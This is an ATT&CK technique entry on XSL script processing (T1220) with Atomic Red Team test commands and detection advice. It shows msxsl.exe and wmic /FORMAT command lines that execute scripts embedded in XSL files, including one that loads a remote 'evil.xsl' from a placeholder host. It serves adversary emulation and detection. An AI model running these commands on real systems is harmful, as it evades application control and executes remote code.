# T1220 - XSL Script Processing
Adversaries may bypass application control and obscure execution of code by embedding scripts inside XSL files. Extensible Stylesheet Language (XSL) files are commonly used to describe the processing and rendering of data within XML files. To support complex operations, the XSL standard includes support for embedded scripting in various languages. (Citation: Microsoft XSLT Script Mar 2017)

Adversaries may abuse this functionality to execute arbitrary files while potentially bypassing application control. Similar to [Trusted Developer Utilities Proxy Execution](https://attack.mitre.org/techniques/T1127), the Microsoft common line transformation utility binary (msxsl.exe) (Citation: Microsoft msxsl.exe) can be installed and used to execute malicious JavaScript embedded within local or remote (URL referenced) XSL files. (Citation: Penetration Testing Lab MSXSL July 2017) Since msxsl.exe is not installed by default, an adversary will likely need to package it with dropped files. (Citation: Reaqta MSXSL Spearphishing MAR 2018) Msxsl.exe takes two main arguments, an XML source file and an XSL stylesheet. Since the XSL file is valid XML, the adversary may call the same XSL file twice. When using msxsl.exe adversaries may also give the XML/XSL files an arbitrary file extension.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: Penetration Testing Lab MSXSL July 2017)(Citation: XSL Bypass Mar 2019)

* <code>msxsl.exe customers[.]xml script[.]xsl</code>
* <code>msxsl.exe script[.]xsl script[.]xsl</code>
* <code>msxsl.exe script[.]jpeg script[.]jpeg</code>

Another variation of this technique, dubbed “Squiblytwo”, involves using [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) to invoke JScript or VBScript within an XSL file.(Citation: LOLBAS Wmic) This technique can also execute local/remote scripts and, similar to its [Regsvr32](https://attack.mitre.org/techniques/T1117)/ "Squiblydoo" counterpart, leverages a trusted, built-in Windows tool. Adversaries may abuse any alias in [Windows Management Instrumentation](https://attack.mitre.org/techniques/T1047) provided they utilize the /FORMAT switch.(Citation: XSL Bypass Mar 2019)

Command-line examples:(Citation: XSL Bypass Mar 2019)(Citation: LOLBAS Wmic)

* Local File: <code>wmic process list /FORMAT:evil[.]xsl</code>
* Remote File: <code>wmic os get /FORMAT:”https[:]//example[.]com/evil[.]xsl”</code>

## Atomic Tests

#Import the Module before running the tests.
Import-Module /Users/0x6c/AtomicRedTeam/atomics/invoke-atomicredteam/Invoke-AtomicRedTeam.psd1 - Force

### Atomic Test #1 - MSXSL Bypass using local files
Executes the code specified within a XSL script tag during XSL transformation using a local payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe when test sucessfully executed, while AV turned off.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
```

Invoke-AtomicTest T1220 -TestNumbers 1

### Atomic Test #2 - MSXSL Bypass using remote files
Executes the code specified within a XSL script tag during XSL transformation using a remote payload. Requires download of MSXSL from Microsoft at https://www.microsoft.com/en-us/download/details.aspx?id=21714. Open Calculator.exe when test sucessfully executed, while AV turned off.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
C:\Windows\Temp\msxsl.exe #{xmlfile} #{xslfile}
```

Invoke-AtomicTest T1220 -TestNumbers 2

### Atomic Test #3 - WMIC bypass using local XSL file
Executes the code specified within a XSL script using a local payload.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
wmic #{wmic_command} /FORMAT:"#{local_xsl_file}"
```

Invoke-AtomicTest T1220 -TestNumbers 3

### Atomic Test #4 - WMIC bypass using remote XSL file
Executes the code specified within a XSL script using a remote payload. Open Calculator.exe when test sucessfully executed, while AV turned off.

**Supported Platforms:** windows
#### Attack Commands: Run with `command_prompt`
```command_prompt
wmic #{wmic_command} /FORMAT:"#{remote_xsl_file}"
```

Invoke-AtomicTest T1220 -TestNumbers 4

## Detection
Use process monitoring to monitor the execution and arguments of msxsl.exe and wmic.exe. Compare recent invocations of these utilities with prior history of known good arguments and loaded files to determine anomalous and potentially adversarial activity (ex: URL command line arguments, creation of external network connections, loading of DLLs associated with scripting). (Citation: LOLBAS Wmic) (Citation: Twitter SquiblyTwo Detection APR 2018) Command arguments used before and after the script invocation may also be useful in determining the origin and purpose of the payload being loaded.

The presence of msxsl.exe or other utilities that enable proxy execution that are typically used for development, debugging, and reverse engineering on a system that is not used for these purposes may be suspicious.